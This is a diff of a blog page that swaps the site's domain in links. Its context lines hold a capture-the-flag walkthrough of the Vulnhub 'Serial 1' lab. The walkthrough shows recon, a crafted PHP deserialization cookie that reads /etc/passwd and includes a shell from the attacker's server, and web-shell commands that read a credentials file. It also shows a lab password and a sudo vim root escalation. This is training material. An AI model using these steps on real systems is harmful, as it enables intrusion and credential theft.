@@ -15,7 +15,7 @@ Output of netdiscover.
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="#252627" />
-<link rel="canonical" href="https://hexterisk.github.io/blog/posts/2020/05/08/serial-1/" />
+<link rel="canonical" href="https://hexterisk.tech/blog/posts/2020/05/08/serial-1/" />
 
 
     <title>
@@ -31,17 +31,17 @@ Output of netdiscover.
 
 
 
-<link rel="stylesheet" href="https://hexterisk.github.io/blog/main.min.c8585fd607292199b471f54e83f63f2c9c8b59a00490e9de2e0259cf4b706c23.css">
+<link rel="stylesheet" href="https://hexterisk.tech/blog/main.min.c8585fd607292199b471f54e83f63f2c9c8b59a00490e9de2e0259cf4b706c23.css">
 
 
 
 
-    <link rel="apple-touch-icon" sizes="180x180" href="https://hexterisk.github.io/blog/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="https://hexterisk.github.io/blog/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="https://hexterisk.github.io/blog/favicon-16x16.png">
-    <link rel="manifest" href="https://hexterisk.github.io/blog/site.webmanifest">
-    <link rel="mask-icon" href="https://hexterisk.github.io/blog/safari-pinned-tab.svg" color="#252627">
-    <link rel="shortcut icon" href="https://hexterisk.github.io/blog/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://hexterisk.tech/blog/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://hexterisk.tech/blog/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://hexterisk.tech/blog/favicon-16x16.png">
+    <link rel="manifest" href="https://hexterisk.tech/blog/site.webmanifest">
+    <link rel="mask-icon" href="https://hexterisk.tech/blog/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://hexterisk.tech/blog/favicon.ico">
     <meta name="msapplication-TileColor" content="#252627">
     <meta name="theme-color" content="#252627">
 
@@ -56,12 +56,12 @@ Output of netdiscover.
 <meta itemprop="datePublished" content="2020-05-08T00:00:00&#43;00:00" />
 <meta itemprop="dateModified" content="2020-05-08T00:00:00&#43;00:00" />
 <meta itemprop="wordCount" content="722">
-<meta itemprop="image" content="https://hexterisk.github.io/blog"/>
+<meta itemprop="image" content="https://hexterisk.tech/blog"/>
 
 
 
 <meta itemprop="keywords" content="Serial1,Vulnhub,pentesting,penetration,testing,vim," /><meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://hexterisk.github.io/blog"/>
+<meta name="twitter:image" content="https://hexterisk.tech/blog"/>
 
 <meta name="twitter:title" content="Serial 1"/>
 <meta name="twitter:description" content="Name: serial: 1 Date release: 20 Aug 2019 Author: sk4 Series: serial  Initial Discovery VMIP is the VM’s IP Address
@@ -93,7 +93,7 @@ Output of netdiscover.
         <div class="container">
             <header class="header">
     <span class="header__inner">
-        <a href="https://hexterisk.github.io/blog/" style="text-decoration: none;">
+        <a href="https://hexterisk.tech/blog/" style="text-decoration: none;">
     <div class="logo">
         
             <span class="logo__mark">></span>
@@ -107,7 +107,7 @@ Output of netdiscover.
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="https://hexterisk.github.io/blog/about/">About</a></li><li><a href="https://hexterisk.github.io/blog/posts/">Posts</a></li>
+    <ul class="menu__inner"><li><a href="https://hexterisk.tech/blog/about/">About</a></li><li><a href="https://hexterisk.tech/blog/posts/">Posts</a></li>
     </ul>
 </nav>
 
@@ -144,7 +144,7 @@ Output of netdiscover.
 
         <article>
             <h1 class="post-title">
-                <a href="https://hexterisk.github.io/blog/posts/2020/05/08/serial-1/">Serial 1</a>
+                <a href="https://hexterisk.tech/blog/posts/2020/05/08/serial-1/">Serial 1</a>
             </h1>
 
             
@@ -164,20 +164,20 @@ Output of netdiscover.
 <h3 id="ip-discovery">IP Discovery</h3>
 <p>Run <code>sudo netdiscover</code>.</p>
 <p>It detects online hosts by sending ARP requests.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/1_image.png" alt="&ldquo;netdiscover&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/1_image.png" alt="&ldquo;netdiscover&rdquo;">
 <em>Output of netdiscover.</em></p>
 <p>192.168.1.8 happens to be the IP of the VM.</p>
 <h3 id="port-discovery">Port Discovery</h3>
 <p>Next, we move on to port discovery to find out if there any exposed ports, and their corresponding services.</p>
 <p>Run <code>nmap -sC -sV -p- -A 192.168.1.8</code></p>
 <p>Format: <code>nmap -sC -sV -p- -A VMIP</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/2_image.png" alt="&ldquo;nmap&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/2_image.png" alt="&ldquo;nmap&rdquo;">
 <em>Output of nmap.</em></p>
 <p>Nothing of consequence, although we might attempt connecting to the ssh service if we somehow get hold of the credentials.</p>
 <h3 id="directory-discovery">Directory Discovery</h3>
 <p>Attempting to enumerate through all the endpoints.</p>
 <p>Here, we are using <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt">common.txt</a> wordlist.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/3_image.png" alt="&ldquo;gobuster&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/3_image.png" alt="&ldquo;gobuster&rdquo;">
 <em>Output of gobuster.</em></p>
 <p><code>WORDLIST</code> is the dictionary containing a list of possible endpoints.</p>
 <p>Run <code>gobuster dir -w common.txt -u 192.168.1.8</code></p>
@@ -185,22 +185,22 @@ Output of netdiscover.
 <p><code>/backup</code> endpoint seems interesting.</p>
 <h3 id="manual-discovery">Manual Discovery</h3>
 <p>So we visit the homepage.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/16_image.png" alt="&ldquo;home&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/16_image.png" alt="&ldquo;home&rdquo;">
 <em>Homepage.</em></p>
 <p>The word cookie seems to have some significance here. Let’s check out the cookies on the page.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/17_image.png" alt="&ldquo;cookie&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/17_image.png" alt="&ldquo;cookie&rdquo;">
 <em>user cookie.</em></p>
 <p>A cookie does exists for the user.</p>
 <p>Let&rsquo;s checkout the <code>/backup</code> endpoint.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/31_image.png" alt=""/backup&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/31_image.png" alt=""/backup&rdquo;">
 <em>/backup endpoint.</em></p>
 <p>A <strong>bak.zip</strong> is present. Download it and uncompress it.</p>
 <p>Run <code>unzip bak.zip</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/4_image.png" alt="&ldquo;bak&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/4_image.png" alt="&ldquo;bak&rdquo;">
 <em>Files inside bak.zip</em></p>
 <p>Analysis of the files is given as follows:</p>
 <h5 id="indexphp">index.php</h5>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/6_image.png" alt="&ldquo;index&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/6_image.png" alt="&ldquo;index&rdquo;">
 <em>index.php</em></p>
 <p>We can see that a cookie is formed here, serialized and base64 encoded, based on the username provided.</p>
 <p>The default cookie is <code>Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0 =</code>.</p>
@@ -209,26 +209,26 @@ Output of netdiscover.
 <span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjM6InNrNCI7czo5OiIAVXNlcgB3ZWwiO086NzoiV2VsY29tZSI6MDp7fX0 =&#34;</span>))
 </code></pre></div><p><code>O: 4: ”User”: 2: {s: 10: ”Username”; s: 3: ”sk4&quot;; s: 9: ”Userwel”; O: 7: ”Welcome”: 0: {}}</code></p>
 <h5 id="userclassphp">user.class.php</h5>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/7_image.png" alt="&ldquo;user.class&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/7_image.png" alt="&ldquo;user.class&rdquo;">
 <em>user.class.php</em></p>
 <p>The log class file is imported. This could potentially contain a vulnerability for LFI/RFI.</p>
 <h5 id="logclassphp">log.class.php</h5>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/8_image.png" alt="&ldquo;log.class&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/8_image.png" alt="&ldquo;log.class&rdquo;">
 <em>log.class.php</em></p>
 <p>The stray <strong>$type_log</strong> variable could be used to mention files. Other than that, Plain and simple file that executes an echo for the message provided to it.</p>
 <h1 id="hunting-begins">Hunting begins</h1>
 <p>We add the line <code>echo base64_encode(serialize(new User('admin')));</code> to obtain a cookie with user set as admin.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/12_image.png" alt="&ldquo;admin_cookie&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/12_image.png" alt="&ldquo;admin_cookie&rdquo;">
 <em>Output a cookie with user set as admin.</em></p>
 <p>We change the initialization class of the object <strong>$this→wel</strong>.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/10_image.png" alt="&ldquo;wel&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/10_image.png" alt="&ldquo;wel&rdquo;">
 <em>Modified wel object.</em></p>
 <p>We point the <strong>$type_log</strong> to <em><strong>/etc/passwd</strong></em>.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/11_image.png" alt="&ldquo;type_log&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/11_image.png" alt="&ldquo;type_log&rdquo;">
 <em>Modified $type_log variable.</em></p>
 <p>We then execute the <em><strong>user.class.php</strong></em> file to see if our changes yielded any results.</p>
 <p>Run <code>php user.class.php</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/13_image.png" alt="&ldquo;user.class&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/13_image.png" alt="&ldquo;user.class&rdquo;">
 <em>Modified user.class.php output.</em></p>
 <p>We got the output of <em><strong>/etc/passwd</strong></em>, as specified in the changes.</p>
 <p>A new cookie is also obtained.</p>
@@ -237,12 +237,12 @@ Output of netdiscover.
 <p><code>O:4:&quot;User&quot;:2:{s:10:&quot;Username&quot;;s:5:&quot;admin&quot;;s:9:&quot;Userwel&quot;;O:3:&quot;Log&quot;:1:{s:13:&quot;Logtype_log&quot;;s:11:&quot;/etc/passwd&quot;;}}</code></p>
 <p>This proves that the instructions lie in the parameters provided inside the cookie.</p>
 <p>We exploit the RFI vulnerability present here by spawning a local server and linking the <strong>$type_log</strong> variable to this shell file.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/14_image.png" alt="&ldquo;python_server&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/14_image.png" alt="&ldquo;python_server&rdquo;">
 <em>Spawn a python3 Simple HTTP Server.</em></p>
 <p>And modify the <em><strong>log.class.php</strong></em> file to fetch the shell.php file.</p>
 <p>Added <code>http://192.168.1.6:8000/shell.php</code></p>
 <p>Format: <code>http://LHIP:8000/shell.php</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/15_image.png" alt="&ldquo;type_log&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/15_image.png" alt="&ldquo;type_log&rdquo;">
 <em>Modified $type_log variable.</em></p>
 <p>Where, the <em><strong>shell.php</strong></em> file is as follows:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
@@ -250,46 +250,46 @@ Output of netdiscover.
 <span style="color:#75715e">?&gt;</span>
 </code></pre></div><p>Obtain the new cookie, and replace it with the previous cookie.</p>
 <p>Run <code>php user.class.php</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/19_image.png" alt="&ldquo;cookie_shell&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/19_image.png" alt="&ldquo;cookie_shell&rdquo;">
 <em>Cookie with shell.</em></p>
 <p>The new cookie <code>Tzo0OiJVc2VyIjoyOntzOjEwOiIAVXNlcgBuYW1lIjtzOjU6ImFkbWluIjtzOjk6IgBVc2VyAHdlbCI7TzozOiJMb2ciOjE6e3M6MTM6IgBMb2cAdHlwZV9sb2ciO3M6MzM6Imh0dHA6Ly8xOTIuMTY4LjEuNjo4MDAwL3NoZWxsLnBocCI7fX0=</code></p>
 <p>Decodes to be</p>
 <p><code>O:4:&quot;User&quot;:2:{s:10:&quot;Username&quot;;s:5:&quot;admin&quot;;s:9:&quot;Userwel&quot;;O:3:&quot;Log&quot;:1:{s:13:&quot;Logtype_log&quot;;s:33:&quot;http://192.168.1.6:8000/shell.php&quot;;}}</code></p>
 <p>A <code>GET</code> request at <code>http://192.168.1.3/?cmd=whoami</code></p>
 <p><code>Format: http://LHIP/?cmd=COMMAND</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/21_image.png" alt="&ldquo;request&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/21_image.png" alt="&ldquo;request&rdquo;">
 <em>Output of GET request.</em></p>
 <p>It worked!</p>
 <p>We know have a makeshift shell.</p>
 <p>After exploring around, I found a file named <em><strong>credentials.txt.bak</strong></em> in the root directory.</p>
 <p>A <code>GET</code> request at <code>http://192.168.1.3/?cmd=ls /</code></p>
 <p><code>Format: http://LHIP/?cmd=ls /</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/22_image.png" alt="&ldquo;request&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/22_image.png" alt="&ldquo;request&rdquo;">
 <em>Output of GET request.</em></p>
 <p>A <code>GET</code> request at <code>http://192.168.1.3/?cmd=cat /credentials.txt.bak</code></p>
 <p>Format: <code>http://LHIP/?cmd=cat /credentials.txt.bak</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/23_image.png" alt=""></p>
+<p><img src="https://hexterisk.tech/blog/Serial_1/23_image.png" alt=""></p>
 <p>Output of GET request.</p>
 <blockquote>
 <p>sk4:KywZmnPWW6tTbW5w</p>
 </blockquote>
 <p>They look like credentials of some sort.</p>
 <p>I was able to successfully connect to the SSH service using these values as credentials. In the home directory itself is a file named <em><strong>flag.txt</strong></em>. It&rsquo;s the user flag.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/25_image.png" alt="&ldquo;user_flag&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/25_image.png" alt="&ldquo;user_flag&rdquo;">
 <em>User flag.</em></p>
 <p>Now, for privilege escalation, let&rsquo;s first find out all the binaries that can run with the superuser privilege.</p>
 <p>Run <code>sudo -l</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/28_image.png" alt="&ldquo;sudo&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/28_image.png" alt="&ldquo;sudo&rdquo;">
 -Output of sudo -l._</p>
 <p>Vim can be run as sudo.</p>
 <p>Run <code>sudo /usr/bin/vim</code></p>
 <p>When you are in command mode(you&rsquo;re there already when vim opens), press <code>:</code> to enter commands.</p>
 <p>Enter <code>!/bin/bash</code></p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/29_image.png" alt="&ldquo;root_shell&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/29_image.png" alt="&ldquo;root_shell&rdquo;">
 <em>Spawn a shell from inside vim.</em></p>
 <p>This forcefully spawns a bash shell. Since it is spawned via the vim binary, it will have the same privileges as the vim binary. Thus we obtained a root shell.</p>
 <p>Then just navigate to the root directory and read the flag file.</p>
-<p><img src="https://hexterisk.github.io/blog/Serial_1/30_image.png" alt="&ldquo;root_flag&rdquo;">
+<p><img src="https://hexterisk.tech/blog/Serial_1/30_image.png" alt="&ldquo;root_flag&rdquo;">
 <em>Root flag.</em></p>
 
             </div>
@@ -299,7 +299,7 @@ Output of netdiscover.
 
         <div class="post-info">
                 <p>
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://hexterisk.github.io/blog/tags/serial1">Serial1</a></span><span class="tag"><a href="https://hexterisk.github.io/blog/tags/vulnhub">Vulnhub</a></span><span class="tag"><a href="https://hexterisk.github.io/blog/tags/pentesting">pentesting</a></span><span class="tag"><a href="https://hexterisk.github.io/blog/tags/penetration">penetration</a></span><span class="tag"><a href="https://hexterisk.github.io/blog/tags/testing">testing</a></span><span class="tag"><a href="https://hexterisk.github.io/blog/tags/vim">vim</a></span>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://hexterisk.tech/blog/tags/serial1">Serial1</a></span><span class="tag"><a href="https://hexterisk.tech/blog/tags/vulnhub">Vulnhub</a></span><span class="tag"><a href="https://hexterisk.tech/blog/tags/pentesting">pentesting</a></span><span class="tag"><a href="https://hexterisk.tech/blog/tags/penetration">penetration</a></span><span class="tag"><a href="https://hexterisk.tech/blog/tags/testing">testing</a></span><span class="tag"><a href="https://hexterisk.tech/blog/tags/vim">vim</a></span>
                 </p>
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>722 Words</p>
@@ -317,7 +317,7 @@ Output of netdiscover.
                 <div class="pagination__buttons">
                     
                         <span class="button previous">
-                            <a href="https://hexterisk.github.io/blog/posts/2020/05/09/serial-2/">
+                            <a href="https://hexterisk.tech/blog/posts/2020/05/09/serial-2/">
                                 <span class="button__icon">←</span>
                                 <span class="button__text">Serial 2</span>
                             </a>
@@ -326,7 +326,7 @@ Output of netdiscover.
 
                     
                         <span class="button next">
-                            <a href="https://hexterisk.github.io/blog/posts/2020/05/03/taint-analysis/">
+                            <a href="https://hexterisk.tech/blog/posts/2020/05/03/taint-analysis/">
                                 <span class="button__text">Taint Analysis</span>
                                 <span class="button__icon">→</span>
                             </a>
@@ -346,7 +346,7 @@ Output of netdiscover.
     <div class="footer__inner">
         <div class="footer__content">
             
-                <span><a href="https://hexterisk.github.io/blog">Bhanupratap Singh &copy; 2020</a></span>
+                <span><a href="https://hexterisk.tech/blog">Bhanupratap Singh &copy; 2020</a></span>
             
         </div>
     </div>
@@ -376,7 +376,7 @@ Output of netdiscover.
 
 
 
-<script type="text/javascript" src="https://hexterisk.github.io/blog/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+<script type="text/javascript" src="https://hexterisk.tech/blog/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
 
 
 
